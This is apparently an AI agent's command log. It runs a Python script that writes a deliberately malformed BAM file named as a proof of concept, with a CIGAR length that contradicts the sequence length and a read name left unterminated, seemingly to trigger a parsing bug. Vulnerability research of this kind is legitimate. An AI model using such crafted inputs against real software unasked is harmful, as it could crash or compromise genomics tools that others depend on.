message:
Running command: cd /workspace && python3 - <<'PY'
import gzip, struct
payload=bytearray()
payload += b'BAM\x01'
payload += struct.pack('<i',0)  # l_text
payload += struct.pack('<i',0)  # n_ref
# alignment block
l_read_name=4
mapq=0
bin_=0
n_cigar=1
flag=0
l_seq=1
core=struct.pack('<iiIIiiii', -1, 0, (bin_<<16)|(mapq<<8)|l_read_name, (flag<<16)|n_cigar, l_seq, -1, 0, 0)
data=bytearray()
data += b'AAAA'               # qname, no NUL, length multiple of 4
# CIGAR 0x11111112 => op D, all bytes nonzero, qlen 0 != l_seq 1
data += struct.pack('<I',0x11111112)
data += b'\xff' # seq
ndata=16-len(data)
data += b'\xff'*ndata
assert len(data)==16
payload += struct.pack('<i', 32+len(data))
payload += core
data[8]=0xff # qual? wait after qname+cigar, seq at 8, qual at 9; both ff in filler
payload[-0:]
payload += data
open('/workspace/poc1.bam.raw','wb').write(payload)
with gzip.open('/workspace/poc1.bam','wb',compresslevel=9) as f: f.write(payload)
print(len(payload), payload[:32].hex(), data.hex())
PY
file /workspace/poc1.bam /workspace/poc1.bam.raw && ls -l /workspace/poc1.bam*
